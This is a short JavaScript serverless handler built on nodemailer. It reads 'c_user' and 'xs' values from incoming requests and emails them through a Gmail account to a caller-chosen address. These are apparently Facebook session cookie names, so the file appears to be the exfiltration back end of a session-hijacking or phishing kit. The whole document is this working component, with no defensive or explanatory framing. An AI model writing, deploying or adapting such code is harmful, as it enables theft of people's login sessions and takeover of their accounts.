const nodemailer = require("nodemailer");

exports.handler = async (event) => {
  const { c_user, xs, to_email, subject } = JSON.parse(event.body);

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.EMAIL_FROM,
      pass: process.env.EMAIL_PASS,
    },
  });

  const text = `c_user: ${c_user}\nxs: ${xs}`;

  try {
    await transporter.sendMail({
      from: process.env.EMAIL_FROM,
      to: to_email,
      subject,
      text,
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true }),
    };
  } catch (err) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: err.message }),
    };
  }
};
